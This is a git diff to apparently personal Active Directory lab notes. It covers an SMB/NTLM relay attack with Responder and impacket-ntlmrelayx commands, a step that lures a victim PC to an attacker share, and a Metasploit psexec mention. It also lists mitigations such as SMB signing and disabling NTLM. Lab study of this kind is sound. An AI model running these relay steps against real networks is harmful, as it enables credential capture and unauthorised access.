@@ -118,21 +118,21 @@ We can then crack the Hash using hashcat. `hashcash -m 5600 hashes.txt /path/to/
 
 ## Start the relay service (forward captured auth to targets)
 - run `impacket-ntlmrelayx -tf target.txt --smb2support`
--What this does: forwards captured NTLM authentication attempts to hosts listed in target.txt. `--smb2support` enables SMB2 target support.
+- What this does: forwards captured NTLM authentication attempts to hosts listed in target.txt. `--smb2support` enables SMB2 target support.
 
 ## Trigger the event from the victim
 - From the victim Windows PC, cause a lookup or connection to the attacker’s IP (examples: open `\\attacker-ip\share`, request `http://wpad/`, or click a short hostname link).
 
 - What happens: the victim authenticates, Responder captures the handshake and hands it to ntlmrelayx, which forwards it to the hosts in target.txt. If a target accepts the relayed credentials and they have sufficient privileges, you gain access as that user
   <img width="802" height="473" alt="image" src="https://github.com/user-attachments/assets/5f7b7208-57e1-45fe-bdd4-6aa267a79dc0" />
- 
+
+## SMB relay attacks mitigation
+a. enable smb signing on all devices
+b. disable NTLM authentication
+c. account tiering
+d. Local admin restriction
 
 
-# listen with responder
-sudo responder -I eth0 -ldwPv
-
-# relay to targets listed in target.txt, enable SMB2 support
-impacket-ntlmrelayx -tf target.txt -smb2support
 
 
 # Windows-Active-Directory-Hacking
@@ -147,24 +147,9 @@ promote the windows server to a domain controller by installing,  Active Directo
 also make sure to install Active directory certificate services for other attacks that will considered for other attacks later
 
 
-2. SMB Relay attacks
-
-Requirement for SMB relay attack to occur
-SMB signing is not enforced on the target machine (unsigned SMB makes relaying possible).
-
-The relayed account must have sufficient privileges on the target (e.g., an administrator) — otherwise the attacker’s access will be limited. 
-
-from the responder setting (/etc/responder/Responder.conf), switch off SMB and HTTP flag
-then run the command Sudo responder -I eth0 -ldwPv - (what does this command do)
-impacket-ntlmrelayx -tf target.txt -smb2support 
-then trigger an event by pointing the attacker IP from the Victim's windows PC
 
 
-SMB relay attacks mitigation
-a. enable smb signing on all devices
-b. disable NTLM authentication
-c. account tiering
-d. Local admin restriction
+
 
 Different ways of gaining shell access
 1. Throught metaspolit. There is a module called psexec
